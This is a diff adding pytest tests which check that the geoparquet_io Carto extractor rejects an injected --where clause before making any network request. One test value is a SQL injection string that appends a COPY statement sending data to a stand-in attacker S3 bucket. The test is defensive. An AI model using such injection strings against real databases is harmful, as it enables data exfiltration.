@@ -263,6 +263,51 @@ class TestEmptyGeoparquetTable:
         assert geo_meta["version"] == "1.0.0"
 
 
+class TestWhereClauseValidation:
+    """--where must be routed through validate_where_clause (gpio #612 parity).
+
+    A statement-separator injection must be rejected before any network call.
+    """
+
+    INJECTION_WHERE = "1=1); COPY (SELECT 1) TO 's3://attacker/x'; --"
+
+    def test_rejects_semicolon_injection_before_network(self, monkeypatch):
+        """A ';' statement separator in --where is rejected before any request."""
+        import geoparquet_io.core.carto as carto_module
+        from geoparquet_io.core.exceptions import ValidationError
+
+        def _fail_urlopen(*_args, **_kwargs):
+            raise AssertionError("network request attempted before where-clause validation")
+
+        monkeypatch.setattr(carto_module.urllib.request, "urlopen", _fail_urlopen)
+
+        with pytest.raises(ValidationError):
+            carto_to_table(
+                url="https://phl.carto.com/api/v2/sql",
+                table_name="opa_properties_public",
+                where=self.INJECTION_WHERE,
+            )
+
+    def test_allows_legitimate_where(self, monkeypatch):
+        """A legitimate --where does not raise and reaches the fetch stage."""
+        import pyarrow as pa
+
+        import geoparquet_io.core.carto as carto_module
+
+        dummy_table = pa.table({"x": [1]})
+        monkeypatch.setattr(
+            carto_module, "_carto_plain_table", lambda *_args, **_kwargs: dummy_table
+        )
+
+        result = carto_to_table(
+            url="https://phl.carto.com/api/v2/sql",
+            table_name="opa_properties_public",
+            where="population > 1000",
+            geometry=False,
+        )
+        assert result is dummy_table
+
+
 @pytest.mark.network
 class TestCartoToTable:
     """Integration tests for Carto extraction (requires network)."""
